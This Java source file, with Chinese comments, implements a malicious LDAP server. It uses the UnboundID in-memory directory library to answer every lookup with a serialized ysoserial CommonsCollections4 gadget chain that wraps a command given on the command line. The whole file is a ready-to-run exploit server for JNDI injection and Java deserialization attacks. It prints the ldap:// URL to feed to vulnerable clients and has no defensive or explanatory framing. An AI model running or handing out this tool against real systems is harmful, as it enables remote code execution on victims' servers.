package com.ysoserial;

import java.io.*;
import java.net.*;
import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;


import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import ysoserial.payloads.CommonsCollections4;

public class LdapServerMain {
    /*
     * 自己定义 getObject
     * 或者调用 ysoserial 自带的 payload， 如下
     */
    @SuppressWarnings("unchecked")
    private static Object getObject(String cmd) throws Exception {
        CommonsCollections4 commonsCollections4 = new CommonsCollections4();
        return commonsCollections4.getObject(cmd);
    }

    /*
     * com.sun.jndi.ldap.Obj.serializeObject
     */
    private static byte[] serializeObject(Object obj) throws Exception {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        return bos.toByteArray();
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        String cmd;

        OperationInterceptor(String cmd) {
            this.cmd = cmd;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws Exception {
            //使用 ldap 中 javaSerializedData 方式。
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaSerializedData", serializeObject(getObject(this.cmd)));
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    private static void MiniLDAPServer(String addr, int port, String cmd) throws Exception {
        InMemoryDirectoryServerConfig conf = new InMemoryDirectoryServerConfig("a=b");
        conf.setListenerConfigs
            (
                new InMemoryListenerConfig
                    (
                        "listen",
                        InetAddress.getByName(addr),
                        port,
                        ServerSocketFactory.getDefault(),
                        SocketFactory.getDefault(),
                        (SSLSocketFactory) SSLSocketFactory.getDefault()
                    )
            );
        conf.addInMemoryOperationInterceptor(new OperationInterceptor(cmd));
        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(conf);
        ds.startListening();
    }

    public static void main(String[] argv) {
        if (argv.length > 3) {
            System.out.println("***Usage: java -cp ysoserial.LdapServerMain [host] [port] [cmd]");
        }
        try {
            String address = argv[0];
            int port = Integer.parseInt(argv[1]);
            String cmd = argv[2];
            MiniLDAPServer(address, port, cmd);
            System.out.println("***启动Ldap服务器成功***");
            System.out.println("Listening address = " + argv[0]);
            System.out.println("Listening port = " + argv[1]);
            System.out.println("ldap 访问url = ldap://" + address + ":" + port + "/a=b");
        } catch (Exception error) {
            System.out.println("***启动Ldap服务器失败***");
            error.printStackTrace();
        }
    }
}
